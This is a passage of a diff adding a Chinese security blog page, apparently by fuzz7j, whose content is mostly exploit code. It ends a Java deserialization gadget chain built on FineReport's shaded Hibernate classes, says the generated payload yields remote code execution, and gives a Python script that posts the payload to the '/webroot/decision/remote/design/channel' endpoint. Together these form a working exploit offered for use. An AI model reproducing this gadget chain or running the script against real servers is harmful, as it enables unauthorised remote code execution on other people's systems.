+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="nc">AbstractComponentTuplizer</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">"getters"</span><span class="o">).</span><span class="na">set</span><span class="o">(</span><span class="n">tup</span><span class="o">,</span> <span class="n">getters</span><span class="o">);</span>
+
+        <span class="nc">ComponentType</span> <span class="n">t</span> <span class="o">=</span> <span class="nc">Reflections</span><span class="o">.</span><span class="na">createWithConstructor</span><span class="o">(</span><span class="nc">ComponentType</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">AbstractType</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">t</span><span class="o">,</span> <span class="s">"componentTuplizer"</span><span class="o">,</span> <span class="n">tup</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">t</span><span class="o">,</span> <span class="s">"propertySpan"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">t</span><span class="o">,</span> <span class="s">"propertyTypes"</span><span class="o">,</span> <span class="k">new</span> <span class="n">com</span><span class="o">.</span><span class="na">fr</span><span class="o">.</span><span class="na">third</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">hibernate</span><span class="o">.</span><span class="na">type</span><span class="o">.</span><span class="na">Type</span><span class="o">[]{</span>
+                <span class="n">t</span>
+        <span class="o">});</span>
+
+        <span class="nc">TypedValue</span> <span class="n">v1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TypedValue</span><span class="o">(</span><span class="n">t</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">v1</span><span class="o">,</span> <span class="s">"value"</span><span class="o">,</span> <span class="n">tpl</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">v1</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">t</span><span class="o">);</span>
+
+        <span class="nc">TypedValue</span> <span class="n">v2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TypedValue</span><span class="o">(</span><span class="n">t</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">v2</span><span class="o">,</span> <span class="s">"value"</span><span class="o">,</span> <span class="n">tpl</span><span class="o">);</span>
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">v2</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">t</span><span class="o">);</span>
+
+        <span class="k">return</span> <span class="nc">Gadgets</span><span class="o">.</span><span class="na">makeMap</span><span class="o">(</span><span class="n">v1</span><span class="o">,</span> <span class="n">v2</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">makeHibernate5Getter</span><span class="o">(</span><span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">tplClass</span><span class="o">,</span> <span class="nc">String</span> <span class="n">method</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">NoSuchMethodException</span><span class="o">,</span> <span class="nc">SecurityException</span><span class="o">,</span>
+            <span class="nc">ClassNotFoundException</span><span class="o">,</span> <span class="nc">InstantiationException</span><span class="o">,</span> <span class="nc">IllegalAccessException</span><span class="o">,</span> <span class="nc">IllegalArgumentException</span><span class="o">,</span> <span class="nc">InvocationTargetException</span> <span class="o">{</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">getterIf</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.fr.third.org.hibernate.property.access.spi.Getter"</span><span class="o">);</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">basicGetter</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl"</span><span class="o">);</span>
+        <span class="nc">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">bgCon</span> <span class="o">=</span> <span class="n">basicGetter</span><span class="o">.</span><span class="na">getConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Method</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="nc">Object</span> <span class="n">g</span> <span class="o">=</span> <span class="n">bgCon</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">tplClass</span><span class="o">,</span> <span class="s">"test"</span><span class="o">,</span> <span class="n">tplClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="n">method</span><span class="o">));</span>
+        <span class="nc">Object</span> <span class="n">arr</span> <span class="o">=</span> <span class="nc">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">getterIf</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="nc">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">arr</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">g</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">arr</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>生成payload填入data，即可rce。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">gzip</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://127.0.0.1:8075/webroot/decision/remote/design/channel"</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/octet-stream"</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">rep</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rep</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="Success.png" alt="image" /></p>
+
+  </div>
+  
+</div>
+<footer class="footer">
+  <span></span>
+  <span text-align: center>Copyright © 2021 fuzz7j</span>
+</footer>
+<div id="to-top">
+  <span></span>
+  <span></span>
+</div><script type="text/javascript" src="/static/js/blog.js?t=20230716172519"></script>
+<script type="text/javascript" src="/static/js/search.js?t=20230716172519"></script></body>
+</html>
